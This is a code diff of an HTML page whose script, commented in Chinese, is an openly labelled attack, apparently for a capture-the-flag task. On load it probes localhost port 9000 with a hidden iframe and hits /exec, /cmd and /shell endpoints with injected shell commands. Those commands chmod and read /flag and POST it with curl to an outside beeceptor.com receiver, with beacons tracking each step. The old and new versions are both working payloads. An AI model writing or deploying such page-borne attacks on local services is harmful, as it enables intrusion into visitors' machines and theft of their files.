@@ -1,63 +1,89 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
+<head><meta charset="UTF-8"></head>
 <body>
 <script>
-const ATTACKER = "https://1213123.free.beeceptor.com";
-const PORTS = [3000, 5000, 8080, 8888, 9000];
-const PATHS = ["/exec", "/cmd", "/shell", "/api/exec"];
+(function() {
+    // ===== 配置 =====
+    const ATTACKER = "https://1213123.free.beeceptor.com";  // 你的接收端
+    const TARGET_PORT = 9000;                               // 只探测这个端口
+    const PATHS = ["/exec", "/cmd", "/shell", "/api/exec"]; // 可能的命令执行接口
+    const RUN_ID = Math.random().toString(36).substring(2) + Date.now(); // 唯一标记
+    const LOCATION = encodeURIComponent(location.href);
+    const REFERRER = encodeURIComponent(document.referrer || "");
 
-function beacon(path) {
-    const img = new Image();
-    img.src = ATTACKER + path + (path.includes("?") ? "&" : "?") + "t=" + Date.now();
-}
-
-function fire(url, cmd) {
-    const img = new Image();
-    img.src = url + (url.includes("?") ? "&" : "?") + "cmd=" + encodeURIComponent(cmd);
-}
-
-function exploit(port, path) {
-    const cmd = `chmod 777 /flag && cat /flag | curl -X POST -d @- ${ATTACKER}/flag`;
-    fire(`http://localhost:${port}${path}`, cmd);
-}
-
-function main() {
-    beacon("/loaded?u=" + encodeURIComponent(location.href));
-
-    let root = document.body || document.documentElement;
-    if (!root) {
-        beacon("/no-root");
-        return;
+    // 统一的 beacon 函数：发送 GET 请求（通过 Image），携带 run, loc, ref 等信息
+    function beacon(action, extra) {
+        const img = new Image();
+        let url = `${ATTACKER}/${action}?run=${RUN_ID}&loc=${LOCATION}&ref=${REFERRER}`;
+        if (extra) {
+            url += `&${extra}`;
+        }
+        img.src = url;
     }
 
-    for (const port of PORTS) {
-        const iframe = document.createElement("iframe");
-        iframe.style.display = "none";
-        iframe.src = `http://localhost:${port}/`;
+    // 发送带命令的请求（也通过 Image，因为只关心是否发出，不关心响应）
+    function fire(url, cmd) {
+        const img = new Image();
+        img.src = url + (url.includes('?') ? '&' : '?') + 'cmd=' + encodeURIComponent(cmd);
+    }
+
+    // 执行真正的 payload：修改 flag 权限并外发
+    function exploit(port, path) {
+        const cmd = `chmod 777 /flag && cat /flag | curl -X POST -d @- ${ATTACKER}/flag?run=${RUN_ID}`;
+        fire(`http://localhost:${port}${path}`, cmd);
+        beacon("exploit-triggered", `port=${port}&path=${encodeURIComponent(path)}`);
+    }
+
+    // 主攻击流程
+    function startAttack() {
+        beacon("start", `target_port=${TARGET_PORT}`);
+
+        // 获取根元素（body 或 html）
+        let root = document.body || document.documentElement;
+        if (!root) {
+            beacon("error", "msg=no_root_element");
+            return;
+        }
+
+        // 创建一个 iframe 来探测端口是否可达（实际上只要 onload 触发就代表端口开放且服务响应）
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = `http://localhost:${TARGET_PORT}/`;
 
         iframe.onload = () => {
-            beacon(`/iframe-onload?p=${port}`);
-            for (const path of PATHS) {
-                fire(`http://localhost:${port}${path}`,
-                     `curl ${ATTACKER}/ping?p=${port}&h=${encodeURIComponent(path)}`);
-                setTimeout(() => exploit(port, path), 2000);
+            beacon("port-open", `port=${TARGET_PORT}`);
+            // 端口开放，尝试每个路径
+            for (let path of PATHS) {
+                // 先发送一个探测命令，让攻击者知道哪个路径可用
+                const testCmd = `curl ${ATTACKER}/ping?run=${RUN_ID}&port=${TARGET_PORT}&path=${encodeURIComponent(path)}`;
+                fire(`http://localhost:${TARGET_PORT}${path}`, testCmd);
+                // 2 秒后执行真正的 payload
+                setTimeout(() => exploit(TARGET_PORT, path), 2000);
             }
         };
 
         iframe.onerror = () => {
-            beacon(`/iframe-error?p=${port}`);
+            beacon("port-error", `port=${TARGET_PORT}`);
         };
 
         root.appendChild(iframe);
+        // 5 秒后移除 iframe，避免残留
         setTimeout(() => iframe.remove(), 5000);
     }
-}
 
-window.addEventListener("error", e => {
-    beacon("/js-error?m=" + encodeURIComponent(e.message));
-});
+    // 捕获全局 JS 错误并上报
+    window.addEventListener('error', function(e) {
+        beacon("js-error", `msg=${encodeURIComponent(e.message)}`);
+    });
 
-window.addEventListener("load", main);
+    // 确保 DOM 完全加载后再执行
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', startAttack);
+    } else {
+        startAttack();
+    }
+})();
 </script>
 </body>
 </html>
